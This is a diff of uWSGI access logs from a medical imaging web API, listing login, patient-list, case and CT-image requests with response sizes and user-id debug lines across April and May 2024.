-[pid: 2312|app: 0|req: 10/34] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 04:00:03 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 120 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 11/35] 219.239.227.192 () {48 vars in 963 bytes} [Tue Apr 16 04:00:35 2024] POST /api/medical/annotate => generated 146 bytes in 86 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 12/36] 219.239.227.192 () {48 vars in 963 bytes} [Tue Apr 16 04:00:44 2024] POST /api/medical/annotate => generated 147 bytes in 85 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 5/35] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:46 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
+[pid: 1552743|app: 0|req: 11/36] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:49 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2309|app: 0|req: 5/37] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:01:50 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 110 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 17/38] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 04:01:50 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 118 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 13/39] 219.239.227.192 () {46 vars in 814 bytes} [Tue Apr 16 04:03:55 2024] POST /api/user/login => generated 296 bytes in 92 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 16/37] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:50 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 18/40] 219.239.227.192 () {44 vars in 896 bytes} [Tue Apr 16 04:03:55 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 102 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 12/38] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:51 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 19/41] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:03:55 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 92 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 6/39] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:51 2024] GET /api/medical/get_case?patient_id=11 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 20/42] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:04:09 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 97 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
+[pid: 1552739|app: 0|req: 7/40] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:52 2024] GET /api/medical/get_case?patient_id=8 => generated 227 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 14/43] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:04:25 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 90 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552740|app: 0|req: 6/41] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:53 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
+[pid: 1552743|app: 0|req: 13/42] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:53 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 15/44] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:04:29 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 112 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 6/45] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 04:04:29 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 118 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 16/46] 219.239.227.192 () {48 vars in 963 bytes} [Tue Apr 16 04:05:53 2024] POST /api/medical/annotate => generated 146 bytes in 86 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 21/47] 219.239.227.192 () {48 vars in 963 bytes} [Tue Apr 16 04:06:05 2024] POST /api/medical/annotate => generated 147 bytes in 85 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 14/43] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:54 2024] GET /api/medical/get_case?patient_id=11 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
+[pid: 1552742|app: 0|req: 17/44] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:54 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2309|app: 0|req: 7/48] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:07:09 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 111 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 17/49] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 04:07:09 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 118 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 22/50] 122.13.77.124 () {36 vars in 485 bytes} [Tue Apr 16 04:26:06 2024] HEAD /api/medical/get_all_patient => generated 43 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 18/51] 180.101.245.247 () {42 vars in 834 bytes} [Tue Apr 16 04:26:21 2024] GET /api/medical/get_all_patient => generated 43 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 23/52] 59.83.208.107 () {42 vars in 861 bytes} [Tue Apr 16 05:56:37 2024] GET /api/medical/get_ct?patient_id=1&case_id=19 => generated 43 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 19/53] 180.101.244.12 () {42 vars in 844 bytes} [Tue Apr 16 06:19:18 2024] GET /api/medical/get_case?patient_id=6 => generated 43 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 20/54] 219.239.227.192 () {48 vars in 827 bytes} [Tue Apr 16 23:55:54 2024] OPTIONS /api/user/login => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 21/55] 219.239.227.192 () {46 vars in 814 bytes} [Tue Apr 16 23:55:54 2024] POST /api/user/login => generated 296 bytes in 86 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 8/56] 219.239.227.192 () {48 vars in 853 bytes} [Tue Apr 16 23:55:54 2024] OPTIONS /api/medical/get_all_patient => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 8/45] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 23:07:54 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2310|app: 0|req: 5/57] 219.239.227.192 () {44 vars in 896 bytes} [Tue Apr 16 23:55:54 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 99 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 0)
-[pid: 2310|app: 0|req: 6/58] 219.239.227.192 () {48 vars in 864 bytes} [Tue Apr 16 23:55:54 2024] OPTIONS /api/medical/get_case?patient_id=6 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 18/46] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:55 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 24/59] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 23:55:54 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 91 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 25/60] 219.239.227.192 () {48 vars in 864 bytes} [Tue Apr 16 23:56:00 2024] OPTIONS /api/medical/get_case?patient_id=1 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 19/47] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:56 2024] GET /api/medical/get_case?patient_id=9 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 26/61] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 23:56:00 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 91 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 27/62] 219.239.227.192 () {48 vars in 882 bytes} [Tue Apr 16 23:56:32 2024] OPTIONS /api/medical/get_ct?patient_id=1&case_id=17 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 23/63] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 23:56:32 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 147 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 23/64] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 23:56:32 2024] GET /api/medical/get_ct?patient_id=1&case_id=17 => generated 905 bytes in 151 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-用户id  : 5
-用户id  : 5
-[pid: 2313|app: 0|req: 28/65] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 23:56:45 2024] GET /api/medical/get_ct?patient_id=1&case_id=17 => generated 905 bytes in 112 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2310|app: 0|req: 7/66] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 23:56:45 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 111 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 29/67] 219.239.227.192 () {48 vars in 882 bytes} [Tue Apr 16 23:56:51 2024] OPTIONS /api/medical/get_ct?patient_id=1&case_id=19 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 8/68] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 23:56:51 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 104 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 24/69] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 23:56:51 2024] GET /api/medical/get_ct?patient_id=1&case_id=19 => generated 28737 bytes in 117 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-Not Found: /api/session/properties
-[pid: 2313|app: 0|req: 30/70] 185.180.143.18 () {34 vars in 530 bytes} [Wed Apr 17 07:42:57 2024] GET /api/session/properties => generated 2489 bytes in 23 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 25/71] 219.239.227.174 () {46 vars in 776 bytes} [Wed Apr 17 20:58:14 2024] OPTIONS /api/user/login => generated 0 bytes in 15 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 9/72] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 20:58:14 2024] POST /api/user/login => generated 59 bytes in 141 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 31/73] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 20:58:16 2024] POST /api/user/login => generated 59 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 32/74] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 20:58:19 2024] POST /api/user/login => generated 59 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 10/75] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 20:58:19 2024] POST /api/user/login => generated 59 bytes in 93 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 0)
-[pid: 2310|app: 0|req: 9/76] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 20:58:19 2024] POST /api/user/login => generated 59 bytes in 95 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 11/77] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 20:58:20 2024] POST /api/user/login => generated 59 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 1)
-[pid: 2310|app: 0|req: 10/78] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 21:02:46 2024] POST /api/user/login => generated 316 bytes in 1425 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 26/79] 219.239.227.174 () {40 vars in 818 bytes} [Wed Apr 17 21:02:49 2024] GET /api/medical/get_all_patient => generated 753 bytes in 1317 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2313|app: 0|req: 33/80] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:02:50 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 1530 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 27/81] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:03:50 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 28/82] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:03:52 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-用户id  : 1
-[pid: 2309|app: 0|req: 13/83] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:03:52 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 186 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 13/84] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:03:52 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 192 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 29/85] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 21:04:44 2024] POST /api/user/login => generated 316 bytes in 89 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 30/86] 219.239.227.174 () {40 vars in 822 bytes} [Wed Apr 17 21:04:44 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 101 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-用户id  : 1
-[pid: 2309|app: 0|req: 15/87] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:04:45 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 181 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 15/88] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:04:45 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 181 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2309|app: 0|req: 16/89] 219.239.227.174 () {40 vars in 818 bytes} [Wed Apr 17 21:06:06 2024] GET /api/medical/get_all_patient => generated 753 bytes in 105 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 31/90] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:06:07 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 102 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 32/91] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:06:10 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 97 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-用户id  : 1
-[pid: 2309|app: 0|req: 18/92] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:06:15 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 191 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 18/93] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:06:15 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 184 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2313|app: 0|req: 34/94] 219.239.227.174 () {40 vars in 818 bytes} [Wed Apr 17 21:06:27 2024] GET /api/medical/get_all_patient => generated 753 bytes in 109 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 33/95] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:06:27 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 34/96] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:06:30 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 100 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 35/97] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:06:31 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 96 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 36/98] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:06:34 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 99 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 1
-用户id  : 1
-[pid: 2309|app: 0|req: 20/99] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:06:37 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 202 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 20/100] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:06:37 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 213 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
-用户id  : 1
-用户id  : 1
-[pid: 2313|app: 0|req: 35/101] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:07:41 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 119 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 21/102] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:07:41 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 122 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 36/103] 219.239.227.174 () {44 vars in 763 bytes} [Wed Apr 17 21:34:23 2024] POST /api/user/login => generated 296 bytes in 89 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 9/48] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:56 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2309|app: 0|req: 22/104] 219.239.227.174 () {40 vars in 822 bytes} [Wed Apr 17 21:34:23 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 99 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 20/49] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:12:59 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 37/105] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:34:23 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 119 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
+[pid: 1552739|app: 0|req: 10/50] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:12:59 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 37/106] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:34:23 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 126 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 21/51] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:13:00 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2310|app: 0|req: 11/107] 219.239.227.174 () {40 vars in 818 bytes} [Wed Apr 17 21:34:29 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 103 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 15/52] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:00 2024] GET /api/medical/get_case?patient_id=8 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2310|app: 0|req: 12/108] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:34:29 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 16/53] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:13:01 2024] GET /api/medical/get_case?patient_id=11 => generated 227 bytes in 96 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2309|app: 0|req: 23/109] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:34:32 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 17/54] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:01 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 38/110] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:34:54 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 99 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 18/55] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:13:02 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2309|app: 0|req: 24/111] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:34:55 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 102 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 22/56] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:03 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2309|app: 0|req: 25/112] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:34:55 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 100 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 23/57] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:03 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2312|app: 0|req: 38/113] 219.239.227.174 () {40 vars in 829 bytes} [Wed Apr 17 21:34:55 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 11/58] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:04 2024] GET /api/medical/get_case?patient_id=9 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
+[pid: 1552739|app: 0|req: 12/59] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:04 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2312|app: 0|req: 39/114] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:34:57 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 119 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 39/115] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:34:57 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 124 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 19/60] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:05 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
+[pid: 1552739|app: 0|req: 13/61] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:13:05 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
